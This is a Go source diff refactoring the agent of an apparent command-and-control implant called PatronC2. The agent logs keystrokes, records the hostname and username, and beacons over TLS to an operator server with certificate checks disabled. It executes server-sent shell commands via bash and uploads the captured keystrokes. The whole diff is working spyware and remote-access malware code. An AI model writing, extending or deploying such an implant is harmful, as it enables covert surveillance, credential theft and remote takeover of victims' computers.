@@ -19,6 +19,7 @@ import (
 	"github.com/MarinX/keylogger"
 	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/Patron/lib/logger"
+	"github.com/PatronC2/Patron/lib/common"
 )
 
 var (
@@ -31,9 +32,7 @@ var (
 )
 
 func main() {
-
-	enableLogging()
-
+	initialize()
 	config, err := loadCertificate()
 	if err != nil {
 		log.Fatalf("Failed to load certificate: %v\n", err)
@@ -50,7 +49,6 @@ func main() {
 	events := k.Read()
 
 	go func() {
-		// range of events
 		for e := range events {
 			switch e.Type {
 			case keylogger.EvKey:
@@ -66,72 +64,53 @@ func main() {
 	}()
 
 	agentID, hostname, username := generateAgentMetadata()
+	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
+
 	for {
-		handleNoKeysBeacon(config, agentID, hostname, username)
-		sleepInterval := calculateSleepInterval()
-		time.Sleep(time.Second * time.Duration(sleepInterval))
-
-		handleKeysBeacon(config, agentID, hostname, username)
-		time.Sleep(time.Second * time.Duration(sleepInterval))
-	}
-}
-
-func handleNoKeysBeacon(config *tls.Config, agentID, hostname, username string) {
-	beacon, err := establishConnection(config)
-	if err != nil {
-		time.Sleep(5 * time.Second)
-		return
-	}
-	defer beacon.Close()
-
-	ip := getLocalIP(beacon)
-	initMessage := formatInitMessage(agentID, hostname, username, ip, "NoKeysBeacon")
-	sendMessage(beacon, initMessage)
-
-	instruct := receiveInstructions(beacon)
-	if instruct != nil {
-		processInstruction(instruct, beacon)
-		if instruct.CommandType == "kill" {
-			logger.Logf(logger.Info, "Received kill command, exiting.")
-			return
+		beacon, encoder, decoder, err := establishConnection(config)
+		if err != nil {
+			time.Sleep(5 * time.Second)
+			continue
 		}
+		logger.Logf(logger.Info, "Beacon connected")
+
+		ip := getLocalIP(beacon)
+		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip); err != nil {
+			handleError(beacon, "configuration", err)
+			continue
+		}
+
+		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
+			handleError(beacon, "command", err)
+			continue
+		}
+
+		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
+			handleError(beacon, "keylogs", err)
+			continue
+		}
+
+		beacon.Close()
+		logger.Logf(logger.Info, "Beacon successful")
+		time.Sleep(time.Second * time.Duration(calculateSleepInterval()))
 	}
 }
 
-func handleKeysBeacon(config *tls.Config, agentID, hostname, username string) {
-	beacon, err := establishConnection(config)
-	if err != nil {
-		return
-	}
-	defer beacon.Close()
-
-	ip := getLocalIP(beacon)
-	keysMessage := formatInitMessage(agentID, hostname, username, ip, "KeysBeacon")
-	sendMessage(beacon, keysMessage)
-
-	keyinstruct := receiveKeyInstructions(beacon)
-	if keyinstruct != nil {
-		sendCachedKeys(beacon, keyinstruct)
-	}
-}
-
-func enableLogging() {
-	enableLogging := true
-	logger.EnableLogging(enableLogging)
-	err := logger.SetLogFile("app.log")
-	if err != nil {
+func initialize() {
+	logger.EnableLogging(true)
+	if err := logger.SetLogFile("app.log"); err != nil {
 		fmt.Printf("Error setting log file: %v\n", err)
 	}
+	common.RegisterGobTypes()
 }
 
 func loadCertificate() (*tls.Config, error) {
-	publickey, err := base64.StdEncoding.DecodeString(RootCert)
+	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
 	if err != nil {
 		return nil, err
 	}
-
 	roots := x509.NewCertPool()
-	if !roots.AppendCertsFromPEM(publickey) {
+	if !roots.AppendCertsFromPEM(publicKey) {
 		return nil, fmt.Errorf("failed to parse root certificate")
 	}
 	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
@@ -139,107 +118,144 @@ func loadCertificate() (*tls.Config, error) {
 
 func generateAgentMetadata() (string, string, string) {
 	agentID := uuid.New().String()
-	hostname, err := exec.Command("hostname", "-f").Output()
-	if err != nil {
-		hostname = []byte("unknown-host")
-	}
-	username, err := exec.Command("whoami").Output()
-	if err != nil {
-		username = []byte("unknown-user")
-	}
-	return agentID, strings.TrimSpace(string(hostname)), strings.TrimSpace(string(username))
+	hostname, username := executeCommand("hostname -f"), executeCommand("whoami")
+	if hostname == "" { hostname = "unknown-host" }
+	if username == "" { username = "unknown-user" }
+	return agentID, hostname, username
 }
 
-func establishConnection(config *tls.Config) (*tls.Conn, error) {
-	beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
+func executeCommand(command string) string {
+	output, _ := exec.Command("bash", "-c", command).Output()
+	return strings.TrimSpace(string(output))
+}
+
+func establishConnection(config *tls.Config) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
+	beacon, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", ServerIP, ServerPort), config)
 	if err != nil {
 		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
+		return nil, nil, nil, err
 	}
-	return beacon, err
+	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
 }
 
 func getLocalIP(beacon *tls.Conn) string {
-	ipAddress := beacon.LocalAddr().(*net.TCPAddr)
-	return fmt.Sprintf("%v", ipAddress)
+	return beacon.LocalAddr().(*net.TCPAddr).IP.String()
 }
 
-func formatInitMessage(agentID, hostname, username, ip string, beaconType string) string {
-	return fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s:%s:MASTERKEY", 
-		agentID, username, hostname, ip, beaconType, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
-}
-
-func sendMessage(beacon *tls.Conn, message string) {
-	logger.Logf(logger.Debug, "Sending: %s", message)
-	_, _ = beacon.Write([]byte(message + "\n"))
-}
-
-func receiveInstructions(beacon *tls.Conn) *types.GiveAgentCommand {
-	dec := gob.NewDecoder(beacon)
-	instruct := &types.GiveAgentCommand{}
-	err := dec.Decode(instruct)
-	if err != nil {
-		logger.Logf(logger.Error, "Error decoding instructions: %v", err)
-		return nil
+func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip string) error {
+	configReq := createConfigurationRequest(agentID, hostname, username, ip)
+	if err := sendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
+		return err
 	}
-	return instruct
+
+	var response types.Response
+	if err := decoder.Decode(&response); err != nil {
+		return err
+	}
+
+	if response.Type == types.ConfigurationResponseType {
+		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
+			updateClientConfig(configResponse)
+		} else {
+			return fmt.Errorf("unexpected payload type")
+		}
+	} else {
+		return fmt.Errorf("unexpected response type: %v", response.Type)
+	}
+	return nil
 }
 
-func processInstruction(instruct *types.GiveAgentCommand, beacon *tls.Conn) {
-	updateConfig(instruct)
-	result := executeCommand(instruct)
-
-    logger.Logf(logger.Debug, "Sending command response: %v", result)
-
-	encoder := gob.NewEncoder(beacon)
-	err := encoder.Encode(result)
-	if err != nil {
-		logger.Logf(logger.Error, "Error sending response: %v", err)
-	}
-	logger.Logf(logger.Debug, "Sent encoded response")
-}
-
-func updateConfig(instruct *types.GiveAgentCommand) {
-	if instruct.UpdateAgentConfig.CallbackTo != "" {
-		glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
-		ServerIP, ServerPort = glob[0], glob[1]
-	}
-	if instruct.UpdateAgentConfig.CallbackFrequency != "" {
-		CallbackFrequency = instruct.UpdateAgentConfig.CallbackFrequency
-	}
-	if instruct.UpdateAgentConfig.CallbackJitter != "" {
-		CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
+func createConfigurationRequest(agentID, hostname, username, ip string) types.ConfigurationRequest {
+	return types.ConfigurationRequest{
+		AgentID:           agentID,
+		Username:          username,
+		Hostname:          hostname,
+		AgentIP:           ip,
+		ServerIP:          ServerIP,
+		ServerPort:        ServerPort,
+		CallbackFrequency: CallbackFrequency,
+		CallbackJitter:    CallbackJitter,
+		MasterKey:         "MASTERKEY",
 	}
 }
 
-func executeCommand(instruct *types.GiveAgentCommand) types.GiveServerResult {
-    var result string
-	var CmdOut string
+func updateClientConfig(config types.ConfigurationResponse) {
+	updateConfigField(&ServerIP, config.ServerIP, "callback IP")
+	updateConfigField(&ServerPort, config.ServerPort, "callback port")
+	updateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
+	updateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
+}
+
+func updateConfigField(current *string, new, fieldName string) {
+	if *current != new {
+		logger.Logf(logger.Info, "Updating %s", fieldName)
+		*current = new
+	}
+}
+
+func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
+	logger.Logf(logger.Info, "Fetching commands to run")
+	for {
+		if err := sendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
+			return err
+		}
+
+		var response types.Response
+		if err := decoder.Decode(&response); err != nil {
+			return fmt.Errorf("error decoding command response: %v", err)
+		}
+
+		if response.Type == types.CommandResponseType {
+			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
+				commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
+				if commandResult.CommandResult == "2" {
+					break
+				}
+			} else {
+				return fmt.Errorf("unexpected payload type")
+			}
+		} else if response.Type == types.CommandStatusResponseType {
+			if commandStatusResponse, ok := response.Payload.(types.CommandStatusResponse); ok {
+				logger.Logf(logger.Info, "Server received command success message: %v", commandStatusResponse)
+			}
+		} else {
+			return fmt.Errorf("unexpected response type: %v", response.Type)
+		}
+	}
+	return nil
+}
+
+func executeAndReportCommand(beacon *tls.Conn, encoder *gob.Encoder, instruct types.CommandResponse) types.CommandStatusRequest {
+	commandResult := executeCommandRequest(&instruct)
+	sendRequest(encoder, types.CommandStatusRequestType, commandResult)
+	return commandResult
+}
+
+func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusRequest {
+	if instruct.Command == "" && instruct.CommandType == "" {
+		logger.Logf(logger.Info, "No command to execute.")
+		return types.CommandStatusRequest{CommandResult: "2"}
+	}
+
+	var CmdOut, result string
 	switch instruct.CommandType {
 	case "shell":
-		CmdOut = runShellCommand(instruct.Command)
-        result = "1"
-	case "update":
-		CmdOut = "Success"
-        result = "1"
+		CmdOut, result = runShellCommand(instruct.Command), "1"
 	case "kill":
-		CmdOut = "~Killed~"
-        result = "1"
+		CmdOut, result = "~Killed~", "1"
 	default:
-		CmdOut = ""
-        result = "2"
+		result = "2"
 	}
-	return types.GiveServerResult{
-		Uuid:        instruct.UpdateAgentConfig.Uuid,
-		Result:      result,
-		Output:      CmdOut,
-		CommandUUID: instruct.CommandUUID,
+
+	return types.CommandStatusRequest{
+		AgentID:       instruct.AgentID,
+		CommandID:     instruct.CommandID,
+		CommandResult: result,
+		CommandOutput: CmdOut,
 	}
 }
 
 func runShellCommand(command string) string {
-	if command == "" {
-		return ""
-	}
 	cmd := exec.Command("bash", "-c", command)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
@@ -251,35 +267,40 @@ func runShellCommand(command string) string {
 }
 
 func calculateSleepInterval() float64 {
+	rand.Seed(time.Now().UnixNano())
 	frequency, _ := strconv.Atoi(CallbackFrequency)
 	jitter, _ := strconv.Atoi(CallbackJitter)
 	jitterPercent := float64(jitter) * 0.01
 	baseTime := float64(frequency)
-	rand.Seed(time.Now().UnixNano())
 	variance := baseTime * jitterPercent * rand.Float64()
 	return baseTime - (jitterPercent * baseTime) + 2*variance
 }
 
-func receiveKeyInstructions(beacon net.Conn) *types.KeySend {
-	decoder := gob.NewDecoder(beacon)
-	keyinstruct := &types.KeySend{}
-	if err := decoder.Decode(keyinstruct); err != nil {
-		logger.Logf(logger.Error, "Error receiving key instructions: %v", err)
-		return nil
-	}
-	return keyinstruct
+func sendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
+	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
 }
 
-func sendCachedKeys(beacon net.Conn, keyinstruct *types.KeySend) {
-	keyResponse := types.KeyReceive{
-		Uuid: keyinstruct.Uuid,
+func handleError(beacon *tls.Conn, reqType string, err error) {
+	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
+	beacon.Close()
+	time.Sleep(2 * time.Second)
+}
+
+func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
+	logger.Logf(logger.Info, "Sending keylogs")
+	keyResponse := types.KeysRequest{
+		AgentID: agentID,
 		Keys: cache,
+	}
+
+	if err := sendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
+		return err
+	}
+	var response types.Response
+	if err := decoder.Decode(&response); err != nil {
+		return fmt.Errorf("error decoding command response: %v", err)
 	}
 	cache = ""
 
-	encoder := gob.NewEncoder(beacon)
-	if err := encoder.Encode(keyResponse); err != nil {
-		logger.Logf(logger.Error, "Error sending cached keys: %v", err)
-	}
-	logger.Logf(logger.Debug, "Sent cached keys: %v", keyResponse)
+	return nil
 }
